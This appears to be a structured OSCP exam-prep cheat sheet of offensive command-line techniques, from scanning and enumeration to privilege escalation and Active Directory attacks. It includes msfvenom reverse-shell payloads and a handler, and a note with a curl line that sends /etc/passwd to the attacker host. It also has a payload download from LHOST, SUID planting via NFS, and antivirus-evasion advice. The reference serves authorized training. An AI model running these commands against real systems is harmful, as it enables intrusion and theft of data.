meta.title: OSCP CLI Cheat-Sheet
meta.note: Educational reference for authorized exam prep and lab use only. Replace TARGET/LHOST/LPORT/USER placeholders before running. Only test systems you own or are explicitly authorized to assess.

entries.title: Quick full TCP port scan
entries.desc: Fast sweep of all 65535 TCP ports to find what is open before deep enumeration.
entries.notes: Follow up open ports with a -sCV scan. Keep -oN output for your notes/report.

entries.title: Service + default-script scan on found ports
entries.desc: Version detection (-sV) plus default NSE scripts (-sC) on the specific open ports.
entries.notes: Swap the port list for whatever your -p- scan returned.

entries.title: Full aggressive scan
entries.desc: -A bundles OS detection, version, default scripts, and traceroute.
entries.notes: Convenient but loud; prefer staged scans when stealth matters.

entries.title: Top UDP ports
entries.desc: UDP services are often missed. SNMP (161), DNS (53), TFTP (69) can reveal a lot.
entries.notes: UDP scans are slow; keep the port count modest.

entries.title: Vulnerability NSE scripts
entries.desc: Runs the 'vuln' category of NSE scripts against the given ports.
entries.notes: Verify any hit manually; NSE has false positives.

entries.title: RustScan (fast port discovery)
entries.desc: Very fast port finder that pipes open ports into nmap for detail.
entries.notes: Great first step; everything after '--' is passed to nmap.

entries.title: Masscan (high-speed sweep)
entries.desc: Extremely fast TCP scanner for large ranges; re-scan hits with nmap.
entries.notes: Lower --rate on fragile targets to avoid dropped results.

entries.title: Ping sweep a subnet
entries.desc: Lists live hosts on a network range without port scanning.
entries.notes: Use fping -a -g or arp-scan -l as alternatives on a local segment.

entries.title: Scan through a proxy/pivot
entries.desc: TCP-connect scan routed via proxychains for internal hosts.
entries.notes: Use -sT (connect) not -sS through SOCKS; add -Pn since ICMP won't work.

entries.title: Directory brute force (gobuster)
entries.desc: Finds hidden directories and files on a web server.
entries.notes: Try seclists raft-medium/big wordlists if common.txt is thin.

entries.title: Recursive content discovery (feroxbuster)
entries.desc: Recurses into discovered directories automatically.
entries.notes: Use -d <depth> to limit recursion; -s to filter status codes.

entries.title: Content discovery (ffuf)
entries.desc: Fast fuzzer; FUZZ is the injection point. Filter by matched status codes.
entries.notes: Use -fs <size> to filter out a noisy default response size.

entries.title: Virtual host / subdomain fuzzing
entries.desc: Discovers name-based virtual hosts the server responds to differently.
entries.notes: Add the discovered vhost to /etc/hosts before browsing it.

entries.title: Fuzz GET parameters
entries.desc: Finds hidden parameters a page accepts.
entries.notes: Switch to -d 'FUZZ=1' -X POST for POST body parameters.

entries.title: Nikto baseline scan
entries.desc: Quick signature scan for known misconfigurations and outdated components.
entries.notes: Noisy. Good for a first pass, not a substitute for manual review.

entries.title: WordPress scan (wpscan)
entries.desc: Enumerates WordPress users, vulnerable plugins and themes.
entries.notes: Users (u) often works without a token; plugin CVEs need the free API token.

entries.title: Inspect headers & tech
entries.desc: Reveals server software, frameworks, and redirect behavior.
entries.notes: Check source/comments and robots.txt and sitemap.xml too.

entries.title: Grab a page & follow redirects
entries.desc: Downloads the page body with a normal user-agent for offline review.
entries.notes: -k ignores TLS errors; -L follows redirects; view-source in a browser too.

entries.title: Read a file with LFI
entries.desc: Local file inclusion. file is the parameter name to change.
entries.notes: Walk up enough directories to leave the web root.

entries.title: Read PHP source
entries.desc: Base64 of a PHP file the include would have executed.
entries.notes: Decode with base64 -d. resource is a path the filter can open.

entries.title: php://input
entries.desc: POST a PHP body to a wrapper include.
entries.notes: This needs allow_url_include. The filter wrapper does not.

entries.title: Poison the access log
entries.desc: Write PHP into the User-Agent of the access log.
entries.notes: Then include that log through the LFI. Apache often uses /var/log/apache2/access.log.

entries.title: Upload a PHP file
entries.desc: POST a file to the upload form. file is the form field name.
entries.notes: If .php is rejected, the cadaver or davtest page is the WebDAV case.

entries.title: Run the uploaded file
entries.desc: Call the file the upload stored.
entries.notes: The directory is whatever the application saved it under.

entries.title: phpinfo
entries.desc: A leftover info page lists disable_functions and the document root.
entries.notes: disable_functions is the line that tells you whether system is present.

entries.title: Users, plugins, themes
entries.desc: Users, vulnerable plugins, and vulnerable themes.
entries.notes: User enum often works with no token. Plugin CVEs use the free API token.

entries.title: Users only
entries.desc: Usernames, without the plugin API.
entries.notes: Those names are the list for a password guess.

entries.title: Password guess
entries.desc: Try passwords for the users you enumerated.
entries.notes: A long list can lock accounts. Read the policy first.

entries.title: Author archive
entries.desc: Redirects to /author/the-login-name when author archives are on.
entries.notes: Increment the number. A 404 means that id is unused.

entries.title: REST users
entries.desc: Usernames from the public REST route.
entries.notes: A 401 means the route is closed. The author archive is the other check.

entries.title: xmlrpc enabled
entries.desc: A POST-only message means XML-RPC is on.
entries.notes: wpscan can guess passwords through it. A missing file means it is off.

entries.title: Login page
entries.desc: Confirms the login URL and the redirect.
entries.notes: The form fields are log and pwd.

entries.title: Debug log
entries.desc: A leftover debug log often has paths and errors.
entries.notes: 404 means it is not there. Do not treat a theme 404 as a miss on this file.

entries.title: Headers on 8080
entries.desc: Server and the manager redirect.
entries.notes: Tomcat is often on 8080, 8009, or 8443 rather than 80.

entries.title: Manager asks for auth
entries.desc: 401 means the manager exists and wants credentials.
entries.notes: 404 means this Tomcat has no manager application.

entries.title: A default password
entries.desc: One common default pair.
entries.notes: The other pairs people try are tomcat:s3cret and admin:admin.

entries.title: Build a WAR
entries.cmd: msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war
entries.desc: A WAR with a JSP reverse shell.
entries.notes: Start the listener before you request the deployed path.

entries.title: Deploy the WAR
entries.desc: Upload the WAR through the text manager.
entries.notes: OK in the reply means it deployed. The app is then /shell.

entries.title: Call the deployed app
entries.desc: Hits the JSP so the payload runs.
entries.notes: The path is the one you passed to deploy.

entries.title: Host manager
entries.desc: The virtual-host manager, separate from the application manager.
entries.notes: The same credentials often work on both.

entries.title: Examples directory
entries.desc: A default examples app means the install was left stock.
entries.notes: Servlets under /examples/servlets/ are the next look.

entries.title: Headers
entries.desc: Jenkins sets X-Jenkins and a login redirect.
entries.notes: The port is often 8080. A reverse proxy may put it on 80.

entries.title: Login
entries.desc: The login page. A 403 on /script means you are not authenticated.
entries.notes: admin:admin and admin:password are the pairs to try first.

entries.title: Download the CLI
entries.desc: The CLI jar from the server itself.
entries.notes: Then who-am-i tells you which account the credentials are.

entries.title: Who am I
entries.desc: The account these credentials map to.
entries.notes: A failure here means the script console will fail too.

entries.title: People list
entries.desc: Usernames, on instances that expose the people directory.
entries.notes: A login page instead of names means this route is authenticated.

entries.title: Crumb
entries.desc: The CSRF crumb later POSTs must send.
entries.notes: A 404 means crumbs are disabled.

entries.title: Script console
entries.desc: The Groovy console. Authenticated users can run code as the Jenkins OS user.
entries.notes: Paste the next line into that page.

entries.title: Run a command there
entries.desc: Groovy that runs id and prints it.
entries.notes: This is pasted into /script. It is not a shell command.

entries.title: Headers
entries.desc: Server: Microsoft-IIS and the ASP.NET version.
entries.notes: X-Powered-By: ASP.NET is the other line.

entries.title: WebDAV methods
entries.desc: The Allow line. PUT and MOVE mean you can try an upload.
entries.notes: A missing PUT means davtest will not get a file on disk.

entries.title: davtest
entries.desc: Which extensions this WebDAV server stores and runs.
entries.notes: An aspx that executes is the one to follow with cadaver.

entries.title: WebDAV scan
entries.desc: Nmap's view of the same WebDAV methods.
entries.notes: Use the port you actually have. 443 needs -p443.

entries.title: web.config
entries.desc: Connection strings and custom errors, when the file is served.
entries.notes: A 404 is normal. A download is the finding.

entries.title: aspnet_client
entries.desc: A default ASP.NET directory.
entries.notes: 200 or 403 means ASP.NET is installed. 404 means this check is done.

entries.title: aspx and config names
entries.desc: Common names plus the extensions IIS executes or stores.
entries.notes: Add -fs with the size of a soft 404 if every line is a hit.

entries.title: Search the version
entries.desc: Exploit-DB entries for the version in the Server header.
entries.notes: Then searchsploit -x the id you want to read.

entries.title: Admin path
entries.desc: The administrator login. 200 or a redirect means Joomla.
entries.notes: The login form posts to /administrator/index.php.

entries.title: joomscan
entries.desc: Version, components, and a first pass of known issues.
entries.notes: Read the version line, then searchsploit that version.

entries.title: Version file
entries.desc: The version element in the manifest.
entries.notes: This path is Joomla 3 and 4. Older sites use the language file.

entries.title: Older version file
entries.desc: Version on Joomla 1 and 2, in the language pack.
entries.notes: Use it when the manifest path is a 404.

entries.title: Config backup
entries.desc: A backup of the file that holds the database password.
entries.notes: Also try configuration.php.old and configuration.php.txt.

entries.title: Search the version
entries.desc: Exploit-DB entries for the version joomscan printed.
entries.notes: Add the version number to the search before you copy one out.

entries.title: Changelog
entries.desc: The version is the first release heading in the file.
entries.notes: Drupal 8 and later often move it to /core/CHANGELOG.txt.

entries.title: Core changelog
entries.desc: The same file on a Drupal 8 or 9 tree.
entries.notes: Use this when /CHANGELOG.txt is a 404.

entries.title: droopescan
entries.desc: Version and a module pass.
entries.notes: Read the version, then searchsploit that version.

entries.title: Login
entries.desc: The login route. 200 means the path is Drupal's.
entries.notes: A default admin is worth one manual try. Do not start with a long list.

entries.title: User as JSON
entries.desc: The uid 1 account name, on sites that serve the user route as JSON.
entries.notes: A 403 means the route is closed. The login page is the other check.

entries.title: First node
entries.desc: A 200 means public nodes are numbered from 1.
entries.notes: Increment the id. Titles and authors sit in the body.

entries.title: Search the version
entries.desc: Exploit-DB entries for the changelog version.
entries.notes: Add the version number before you copy an entry out.

entries.title: HEAD is reachable
entries.desc: 200 and a ref means the .git directory is on the web root.
entries.notes: 403 can still leak files one by one. 404 means it is not there.

entries.title: Read HEAD
entries.desc: The current ref, usually refs/heads/master or main.
entries.notes: That name is the branch you will see after a dump.

entries.title: Read config
entries.desc: Remotes and the repository URL.
entries.notes: A remote URL sometimes contains a username.

entries.title: Dump the repository
entries.desc: Rebuild a working repo from the exposed .git.
entries.notes: git-dumper walks the objects the web server will give it.

entries.title: History
entries.desc: Every commit, including ones not on the current branch.
entries.notes: A password removed later is still in an older patch.

entries.title: Search the history
entries.desc: Commits that added or removed the word password.
entries.notes: Then git -C /tmp/repo show that hash.

entries.title: Zone transfer attempt
entries.desc: Tries a full zone transfer; a misconfigured server dumps every record.
entries.notes: A big win when it works; also try host -l target.local TARGET.

entries.title: Basic record lookups
entries.cmd: dig any target.local @TARGET; dig mx target.local @TARGET
entries.desc: Pulls A/MX/NS/TXT records that hint at hosts and mail infrastructure.
entries.notes: nslookup is the interactive fallback when dig is unavailable.

entries.title: Subdomain brute force (dnsrecon)
entries.desc: Guesses subdomains from a wordlist against the domain.
entries.notes: gobuster dns -d target.local -w <wordlist> does the same job.

entries.title: Reverse DNS lookup
entries.desc: Maps an IP back to a hostname via a PTR record.
entries.notes: Hostnames sometimes reveal naming conventions for other hosts.

entries.title: Anonymous FTP login
entries.cmd: ftp TARGET   # user: anonymous  pass: anything
entries.desc: Checks for anonymous FTP access to read/write files.
entries.notes: Use binary mode for executables; 'ls -la' to see hidden files.

entries.title: SMTP user enumeration
entries.desc: Validates account names via SMTP VRFY/EXPN/RCPT verbs.
entries.notes: nc TARGET 25 then VRFY root also works manually.

entries.title: List NFS exports & mount
entries.cmd: showmount -e TARGET; sudo mount -t nfs TARGET:/export /mnt
entries.desc: Shows exported NFS shares and mounts one locally.
entries.notes: no_root_squash exports can enable SUID-based privesc.

entries.title: MySQL login & dump
entries.desc: Connects to MySQL to enumerate databases and tables.
entries.notes: Try root with no/blank password first; then SELECT from user tables.

entries.title: MSSQL via impacket
entries.desc: Interactive MSSQL client; enable_xp_cmdshell for command execution.
entries.notes: Once in: EXEC xp_cmdshell 'whoami'; after enabling it.

entries.title: Redis unauthenticated access
entries.cmd: redis-cli -h TARGET   # then: INFO, CONFIG GET dir, KEYS *
entries.desc: Open Redis instances leak data and can sometimes write files.
entries.notes: CONFIG SET dir/dbfilename can plant keys or webshells if writable.

entries.title: Version and auth methods
entries.desc: Banner, version, and which logins the server accepts.
entries.notes: publickey with no password method means you need a key.

entries.title: Audit the service
entries.desc: Algorithms and host keys, with the ones that are weak called out.
entries.notes: A second port is ssh-audit -p 2222 TARGET.

entries.title: Log in
entries.desc: Password or agent login on port 22.
entries.notes: Tunnels are oscp cmd pivot. A different port is ssh -p 2222 user@TARGET.

entries.title: Log in with a key
entries.desc: Public-key login. The file is the private key.
entries.notes: If the server refuses the key, the auth-methods line did not offer publickey.

entries.title: Password on the command line
entries.desc: One-shot login when you already have the password.
entries.notes: StrictHostKeyChecking skips the host-key prompt on a lab box.

entries.title: Password guess
entries.desc: Online guesses against SSH. -t 4 is the thread count.
entries.notes: A long list can lock the account. Read the policy first.

entries.title: Nmap brute script
entries.desc: The same guess, run as an NSE script.
entries.notes: The script file is ssh-brute.nse.

entries.title: Other SSH port
entries.desc: Login when the banner is not on port 22.
entries.notes: Point hydra at it with ssh://TARGET:2222.

entries.title: Enumerate SMB shares (smbclient)
entries.desc: Lists shares using a null session (-N = no password).
entries.notes: Connect to a share with: smbclient //TARGET/share -N

entries.title: Recursively download a share
entries.desc: Pulls everything from a readable share for offline review.
entries.notes: smbget -R smb://TARGET/share is another option.

entries.title: SMB enumeration (netexec)
entries.desc: NetExec (formerly crackmapexec) enumerates shares, users, and access.
entries.notes: Add --users, --rid-brute, or --pass-pol when allowed.

entries.title: Full enum (enum4linux-ng)
entries.desc: Aggregates users, groups, shares, and policy via SMB/RPC/LDAP.
entries.notes: The -ng rewrite is faster and cleaner than classic enum4linux.

entries.title: RPC null session
entries.desc: Interactive RPC session; try enumdomusers, querydominfo, lsaquery.
entries.notes: Great for pulling the user list on misconfigured hosts.

entries.title: Check share permissions (smbmap)
entries.desc: Shows READ/WRITE access per share for the given credentials.
entries.notes: smbmap -H TARGET -u '' -p '' tests the null session.

entries.title: LDAP anonymous search
entries.desc: Dumps directory objects when anonymous bind is allowed.
entries.notes: Add '(objectClass=user)' to filter; look for description fields with passwords.

entries.title: Netcat listener
entries.desc: Catches an incoming reverse shell connection on your attack box.
entries.notes: rlwrap nc -lvnp LPORT gives readline history/arrow keys.

entries.title: Bash reverse shell
entries.desc: One-liner reverse shell when bash and /dev/tcp are available.
entries.notes: Wrap in `bash -c '...'` if launched from a limited context.

entries.title: Python reverse shell
entries.desc: Portable reverse shell that also spawns a pty.
entries.notes: Useful where bash /dev/tcp is unavailable.

entries.title: PowerShell reverse shell
entries.desc: Classic Windows reverse shell for a netcat listener.
entries.notes: Base64-encode with -enc to dodge quoting/AV string matches.

entries.title: msfvenom Windows exe payload
entries.cmd: msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe
entries.desc: Generates a standalone reverse-shell binary to drop on the target.
entries.notes: Use windows/shell_reverse_tcp for 32-bit; -f elf for Linux.

entries.title: msfvenom web payloads
entries.cmd: msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw -o shell.php
entries.desc: Produces webshell payloads (php/jsp/aspx/war) for upload vulns.
entries.notes: Swap the payload+-f for aspx, jsp, or war as the stack requires.

entries.title: Upgrade to a full TTY
entries.cmd: python3 -c 'import pty;pty.spawn("/bin/bash")'  # then: Ctrl+Z; stty raw -echo; fg; export TERM=xterm
entries.desc: Turns a dumb shell into an interactive TTY with job control and arrow keys.
entries.notes: After `fg` press Enter. Set size with `stty rows 50 cols 200` if needed.

entries.title: Spawn a TTY without python
entries.desc: Alternative pty upgrade when python is missing.
entries.notes: Other options: perl -e 'exec "/bin/bash"'; or /bin/sh -i.

entries.title: Host files over HTTP (attacker)
entries.desc: Serves the current directory so the target can pull files.
entries.notes: Run from the directory holding your tools/payloads.

entries.title: Upload server (receive files)
entries.cmd: python3 -m uploadserver 8000   # or use a simple PUT-enabled server
entries.desc: Lets a target push files back to you over HTTP.
entries.notes: Target: curl -F 'files=@/etc/passwd' http://LHOST:8000/upload

entries.title: Download on Linux target
entries.cmd: wget http://LHOST/linpeas.sh -O /tmp/linpeas.sh   # or: curl http://LHOST/file -o file
entries.desc: Pulls a file from your HTTP server onto the target.
entries.notes: chmod +x before running scripts.

entries.title: Download on Windows (PowerShell)
entries.desc: Fetches a file on modern Windows.
entries.notes: iwr is the alias; (New-Object Net.WebClient).DownloadFile(...) works on older hosts.

entries.title: Download on Windows (certutil)
entries.desc: LOLBIN download when PowerShell is restricted.
entries.notes: Often flagged by AV; bitsadmin /transfer is another fallback.

entries.title: SMB server for transfer
entries.desc: Stands up an SMB share for copy on/off Windows hosts.
entries.notes: On target: copy \\LHOST\share\file.exe . Add -user/-password for auth.

entries.title: Transfer over netcat
entries.cmd: nc -lvnp 9001 > file   # sender: nc LHOST 9001 < file
entries.desc: Pipes a file across a raw TCP connection when nothing else is available.
entries.notes: Verify with md5sum/certutil -hashfile afterwards.

entries.title: Base64 copy/paste transfer
entries.cmd: base64 -w0 file   # paste on target: echo '<b64>' | base64 -d > file
entries.desc: Moves small files through a text-only shell with no network path.
entries.notes: On Windows: certutil -decode in.b64 out.bin.

entries.title: Automated enum (linpeas)
entries.desc: Broad local enumeration highlighting likely privesc paths.
entries.notes: Review the red/yellow highlights; verify findings manually.

entries.title: Check sudo rights
entries.desc: Lists what the current user may run via sudo, possibly as root.
entries.notes: Cross-reference each binary against GTFOBins.

entries.title: Find SUID binaries
entries.desc: Lists setuid binaries that run as their owner (often root).
entries.notes: Check unusual ones on GTFOBins for escalation techniques.

entries.title: List file capabilities
entries.desc: Finds binaries with Linux capabilities (e.g. cap_setuid) that grant privilege.
entries.notes: cap_setuid+ep on python/perl is an instant root path.

entries.title: Writable cron / scheduled tasks
entries.desc: Root-run jobs that reference writable scripts are a classic path.
entries.notes: Also check for wildcards and relative paths in cron scripts.

entries.title: World-writable files & dirs
entries.desc: Writable files/dirs owned by root may be hijackable.
entries.notes: Pay attention to scripts, configs, and PATH directories.

entries.title: Kernel / OS version
entries.desc: Identifies the kernel and distro to match against known exploits.
entries.notes: Prefer a config/misconfig path over kernel exploits when possible.

entries.title: Hunt for credentials
entries.desc: Searches common locations for plaintext secrets and config passwords.
entries.notes: Check ~/.bash_history, .ssh keys, and database config files too.

entries.title: Processes running as root
entries.desc: Reveals privileged services you might abuse or exploit.
entries.notes: pspy lets you watch cron/process activity without root.

entries.title: NFS no_root_squash abuse
entries.cmd: cat /etc/exports   # look for no_root_squash, then plant a SUID binary via the mount
entries.desc: A no_root_squash export lets you write root-owned SUID binaries.
entries.notes: Mount the share from your box, compile a SUID shell, run it on target.

entries.title: Automated enum (winPEAS)
entries.desc: Enumerates services, permissions, creds, and misconfigs on Windows.
entries.notes: Run the arch-matching build; review quick-wins first.

entries.title: PowerUp checks
entries.desc: PowerShell privesc auditor covering services, paths, and registry.
entries.notes: Reports actionable abuse functions like Install-ServiceBinary.

entries.title: System info & patches
entries.desc: Shows OS build and installed hotfixes for exploit matching.
entries.notes: Feed into windows-exploit-suggester to spot missing patches.

entries.title: Current privileges
entries.desc: Lists token privileges; SeImpersonate/SeAssign hint at Potato attacks.
entries.notes: whoami /all shows groups and SIDs too.

entries.title: SeImpersonate -> SYSTEM (Potato)
entries.desc: Abuses SeImpersonatePrivilege (common on service accounts) to get SYSTEM.
entries.notes: Pick the Potato variant that matches the Windows build.

entries.title: Unquoted service paths
entries.cmd: wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\"
entries.desc: Finds auto-start services whose path is unquoted and may be hijacked.
entries.notes: Need write access to an intermediate directory to exploit.

entries.title: Weak service permissions
entries.desc: Services you can reconfigure (binpath) let you run code as SYSTEM.
entries.notes: sc config <svc> binpath= "cmd /c ..." then restart the service.

entries.title: Stored credentials & registry
entries.cmd: reg query HKLM /f password /t REG_SZ /s   # also: cmdkey /list; reg AutoLogon
entries.desc: Hunts the registry and credential store for saved passwords.
entries.notes: Check winlogon AutoAdminLogon and unattend.xml / sysprep files.

entries.title: Scheduled tasks
entries.desc: Tasks running as a privileged user that call writable scripts are abusable.
entries.notes: Match the task's action path against folders you can write to.

entries.title: Hydra service brute (SSH example)
entries.desc: Online password guessing against a login service.
entries.notes: Swap ssh:// for ftp, smb, rdp, etc. Mind lockouts.

entries.title: Hydra HTTP POST form
entries.desc: Brute forces a web login form; last field is the failure string.
entries.notes: Capture the exact request in Burp to get the path and field names.

entries.title: Identify a hash
entries.desc: Guesses the hash type to pick the right cracking mode.
entries.notes: Context (file, service) often tells you more than the tool.

entries.title: Crack with John
entries.desc: Offline cracking of captured hashes.
entries.notes: unshadow /etc/passwd /etc/shadow > hashes.txt first for Linux logins.

entries.title: Crack with hashcat
entries.desc: GPU-accelerated cracking; -m selects the hash mode.
entries.notes: -m 1000 NTLM, -m 1800 sha512crypt, -m 13100 Kerberoast, -m 18200 AS-REP.

entries.title: Mutate wordlist with rules
entries.desc: Applies rule-based mutations to squeeze more from a wordlist.
entries.notes: best64 and OneRuleToRuleThemAll are strong general-purpose rules.

entries.title: Generate a custom wordlist (cewl)
entries.desc: Scrapes a site to build a target-specific wordlist.
entries.notes: Pair with hashcat rules; crunch builds patterned lists.

entries.title: Crack a protected file (zip/office)
entries.desc: Extracts a crackable hash from a password-protected archive/document.
entries.notes: office2john, ssh2john, pdf2john cover other formats.

entries.title: SSH local port forward
entries.desc: Exposes a remote-only port via your local 8080.
entries.notes: Reach it at http://127.0.0.1:8080 on your box.

entries.title: SSH remote port forward
entries.desc: Pushes a port from the target back to your attack box.
entries.notes: Useful to expose a target-internal service to you.

entries.title: SSH dynamic (SOCKS) proxy
entries.desc: Creates a SOCKS proxy to route tools through the pivot host.
entries.notes: Add 'socks5 127.0.0.1 1080' to /etc/proxychains4.conf, then prefix tools with proxychains.

entries.title: Chisel reverse SOCKS
entries.desc: Tunnels through NAT/firewalls when SSH isn't available.
entries.notes: Pair with proxychains to reach internal hosts.

entries.title: Ligolo-ng tunnel
entries.desc: Creates a tun interface so you can route to whole internal subnets.
entries.notes: Add a route to the target subnet via the ligolo interface.

entries.title: socat port relay
entries.desc: Simple relay forwarding a local port to an internal service.
entries.notes: Handy when you have a shell but no SSH on the pivot.

entries.title: Kerberoast (GetUserSPNs)
entries.desc: Requests service tickets for SPN accounts to crack offline.
entries.notes: Crack the TGS hash with hashcat -m 13100.

entries.title: AS-REP roast
entries.desc: Pulls AS-REP hashes for accounts without pre-auth required.
entries.notes: Crack with hashcat -m 18200.

entries.title: BloodHound collection
entries.cmd: bloodhound-python -u USER -p PASS -d domain.local -ns TARGET -c all
entries.desc: Collects AD objects/relationships to map attack paths.
entries.notes: Import the JSON/zip into the BloodHound GUI to find paths to DA.

entries.title: Password spray (netexec)
entries.desc: Tries one password across many users to avoid lockouts.
entries.notes: Check the lockout policy (--pass-pol) before spraying.

entries.title: Pass-the-hash (psexec)
entries.desc: Authenticates with an NTLM hash instead of a plaintext password.
entries.notes: nxc smb TARGET -u USER -H NTLMHASH also validates the hash.

entries.title: Dump domain hashes (secretsdump)
entries.desc: Extracts SAM/LSA/NTDS secrets once you have sufficient rights.
entries.notes: On a DC with admin, use -just-dc for the full NTDS dump.

entries.title: Enumerate with authenticated LDAP
entries.desc: Pulls users, groups, and descriptions over authenticated LDAP.
entries.notes: --kerberoasting and --asreproast can be done here too.

entries.title: Evil-WinRM shell
entries.cmd: evil-winrm -i TARGET -u USER -p PASS   # or -H NTLMHASH
entries.desc: Interactive WinRM shell for hosts with port 5985 open.
entries.notes: Great for post-exploitation uploads/downloads with menu commands.

entries.title: Search Exploit-DB offline
entries.desc: Searches the local Exploit-DB copy for matching public exploits.
entries.notes: searchsploit -m <id> copies an exploit into the current directory.

entries.title: Examine / update searchsploit
entries.desc: Views an exploit's source and updates the local database.
entries.notes: Always read an exploit before running it; edit LHOST/LPORT/offsets.

entries.title: Compile a C exploit
entries.cmd: gcc exploit.c -o exploit   # 32-bit static: gcc -m32 -static exploit.c -o exploit
entries.desc: Builds a local privesc or service exploit from source.
entries.notes: Match target architecture; static linking avoids missing libs.

entries.title: Metasploit search & use
entries.desc: Finds and loads a Metasploit module non-interactively.
entries.notes: OSCP limits Metasploit to one machine; prefer manual exploits.

entries.title: Start a multi/handler
entries.cmd: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; run'
entries.desc: Catches a Meterpreter/shell payload you generated with msfvenom.
entries.notes: The handler PAYLOAD must match the one baked into your payload.

entries.title: Enumeration loop
entries.cmd: scan ports -> identify services -> enumerate each service -> find version -> search exploits -> get foothold
entries.desc: The core rhythm: never stop enumerating until you have exhausted a service.
entries.notes: If stuck, you almost always missed an enumeration step. Re-scan, re-read.

entries.title: Set up a target workspace
entries.desc: A per-target folder keeps scans, creds, and screenshots organized for the report.
entries.notes: Screenshot every proof (local.txt, proof.txt) with your IP visible.

entries.title: Add target to /etc/hosts
entries.desc: Many web apps and AD services only work with a hostname, not an IP.
entries.notes: Add discovered vhosts here as you find them.

entries.title: After foothold checklist
entries.cmd: whoami; id; hostname; ip a; sudo -l; find SUID; read configs; check history
entries.desc: A quick orientation sweep once you land on a box.
entries.notes: Grab local.txt immediately, then pivot to privesc enumeration.

entries.title: Proof collection
entries.desc: Record the flag plus `whoami`/`hostname`/`ipconfig` in one screenshot.
entries.notes: The exam requires the command output and your IP visible in the shot.

entries.title: Time management
entries.cmd: rotate targets -> note every finding -> take the documented restart if stuck
entries.desc: Don't tunnel-vision one box; cycle and come back with fresh eyes.
entries.notes: Keep report notes as you go — reconstructing steps later wastes hours.

entries.title: New named session
entries.desc: Start a session you can leave and rejoin. Listeners and scans keep running.
entries.notes: Default prefix is Ctrl-b. Ctrl-a is a custom setting in ~/.tmux.conf. Full name: new-session. oscp tmux

entries.title: List sessions
entries.desc: Names and sizes of every session.
entries.notes: Full name: list-sessions. Attach with tmux attach -t NAME.

entries.title: Attach
entries.desc: Rejoin a detached session.
entries.notes: Full name: attach-session. tmux attach alone rejoins the most recent.

entries.title: Reload the config
entries.desc: Apply edits to ~/.tmux.conf without leaving the session.
entries.notes: Short name: source. After your prefix, then : either name works. Default prefix is Ctrl-b. This example uses Ctrl-a.

entries.title: Read the live log safely
entries.desc: Follow the log from a different pane or a different terminal.
entries.notes: This example: Ctrl-a H toggles logging. Default prefix is Ctrl-b. Do not run this in the pane that is logging.

entries.title: Stop the live log pipe
entries.desc: Closes the pipe on the current pane.
entries.notes: Short name: pipep. Ctrl-C first if cat of the log is still running, then prefix+C. This example's prefix is Ctrl-a. Default is Ctrl-b.

entries.title: Save scrollback once
entries.desc: One snapshot of the pane history. This is not the live log.
entries.notes: Short name: capturep. Does not loop. oscp tmux logging

entries.title: List paste buffers
entries.desc: What copy mode last stored. The top buffer is what prefix ] pastes.
entries.notes: Short name: lsb. Enter with prefix [. Emacs keys: Ctrl-Space, then Alt-w. oscp tmux copy

entries.title: Show the paste buffer
entries.desc: Print the newest tmux paste buffer.
entries.notes: Short name: showb. This buffer is what prefix ] pastes. The terminal clipboard is a different paste.

entries.title: Save the paste buffer
entries.desc: Write the newest buffer to a file.
entries.notes: Short name: saveb. oscp tmux copy

entries.title: Paste into the pane
entries.desc: Insert the newest buffer at the cursor. Same as prefix then ].
entries.notes: Short name: pasteb. Default prefix is Ctrl-b. This example's prefix is Ctrl-a. oscp tmux copy

entries.title: Vi keys in copy mode
entries.desc: Space starts the selection, Enter copies and leaves.
entries.notes: Full name: set-option. Stock tmux is emacs: Ctrl-Space, then Alt-w. Back with: tmux set -g mode-keys emacs
